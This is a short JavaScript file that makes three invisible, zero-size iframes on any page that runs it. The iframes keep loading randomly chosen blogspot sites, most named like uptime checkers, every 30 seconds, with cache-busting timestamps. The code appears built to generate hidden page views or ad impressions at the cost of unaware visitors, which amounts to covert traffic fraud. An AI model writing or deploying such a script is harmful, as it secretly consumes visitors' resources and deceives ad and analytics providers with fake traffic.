function shuffleArray(arr) {
  for (let i = arr.length - 1; i > 0; i--) {
    const j = Math.floor(Math.random() * (i + 1));
    [arr[i], arr[j]] = [arr[j], arr[i]];
  }
  return arr;
}

// Hardcoded array of HTML links
const htmlFiles = shuffleArray([
  "https://quickseobuilder.blogspot.com/",
  "https://webalivecheck.blogspot.com/",
  "https://upchecktool.blogspot.com/",
  "https://upordownnow.blogspot.com/",
  "https://statusfetch.blogspot.com/",
  "https://isitupcheck.blogspot.com/",
  "https://pingstatusnow.blogspot.com/",
  "https://sitepingmonitor.blogspot.com/",
  "https://upstatuscheck.blogspot.com/",
  "https://sitepingtool.blogspot.com/",
  "https://checkifonline.blogspot.com/",
  "https://upordownrealtime.blogspot.com/",
  "https://upordownwebsitecheck.blogspot.com/",
  "https://isitreachable.blogspot.com/",
  "https://uptimecheckr.blogspot.com/",
  "https://isitupnow.blogspot.com/",
  "https://webstatuschecker.blogspot.com/",
  "https://pingpeekchecker.blogspot.com/",
  "https://boost-fans-now.blogspot.com/",
  "https://archivewebpagesinstantly.blogspot.com/",
  "https://archiveanyurlinstantly.blogspot.com/",
  "https://updowncheck.blogspot.com/",
  "https://isiteup.blogspot.com/"
]);

// Create invisible iframes that still load
const iframes = [];
for (let i = 0; i < 3; i++) {
  const iframe = document.createElement("iframe");
  iframe.classList.add("full-iframe", "loop", "hidden-iframe");
  iframe.style.width = "0";
  iframe.style.height = "0";
  iframe.style.opacity = "0";
  iframe.style.position = "absolute";
  iframe.style.border = "0";
  document.body.appendChild(iframe);
  iframes.push(iframe);
}

/**
 * Safely appends a cache-busting timestamp parameter.
 * - Uses "&" if URL already has parameters.
 * - If 't=' already exists, switches to another key ('ts=', 'time=', or 'tick=').
 */
function addTimestampParam(url) {
  const hasParams = url.includes("?");
  const hasT = /[?&]t=/.test(url);
  const hasTs = /[?&]ts=/.test(url);
  const hasTime = /[?&]time=/.test(url);

  let paramKey = "t";
  if (hasT) paramKey = hasTs ? (hasTime ? "tick" : "time") : "ts";

  const separator = hasParams ? "&" : "?";
  return `${url}${separator}${paramKey}=${Date.now()}`;
}

function startIframeLoop() {
  if (!htmlFiles.length) {
    console.error("🚫 No HTML files found.");
    return;
  }

  for (const iframe of iframes) {
    function loadNext() {
      const randomFile = htmlFiles[Math.floor(Math.random() * htmlFiles.length)];
      iframe.src = addTimestampParam(randomFile);
    }

    iframe.onload = () => setTimeout(loadNext, 30000);
    loadNext(); // initial load
  }
}

startIframeLoop();
